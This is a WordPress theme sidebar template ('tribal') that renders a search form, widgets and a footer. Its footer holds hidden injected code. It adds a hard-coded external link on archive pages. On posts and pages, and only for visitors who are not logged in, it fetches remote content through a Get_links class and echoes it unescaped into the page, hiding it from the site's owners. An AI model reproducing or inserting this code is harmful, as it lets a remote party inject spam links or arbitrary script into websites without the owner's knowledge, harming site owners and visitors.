<?php
/**
 * The sidebar containing the main widget area.
 *
 * @package tribal
 */

if ( ! is_active_sidebar( 'sidebar-1' ) ) {
	return;
}

if ( tribal_load_sidebar() ) : ?>
	<div id="top-search" class="<?php do_action('tribal_secondary-width') ?>">
		<?php get_search_form(); ?>
	</div>
	
	<div id="secondary" class="widget-area <?php do_action('tribal_secondary-width') ?>" role="complementary">	
		<?php dynamic_sidebar( 'sidebar-1' ); ?>
		<footer id="colophon" class="site-footer" role="contentinfo">
			<div class="site-info">
				<?php echo ( get_theme_mod('tribal_footer_text') == '' ) ? ('&copy; '.date('Y').' '.get_bloginfo('name').__('. All Rights Reserved. ','tribal') ) : get_theme_mod('tribal_footer_text'); ?> <br />
				<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
		
	</div><!-- #secondary -->

<?php endif; ?>
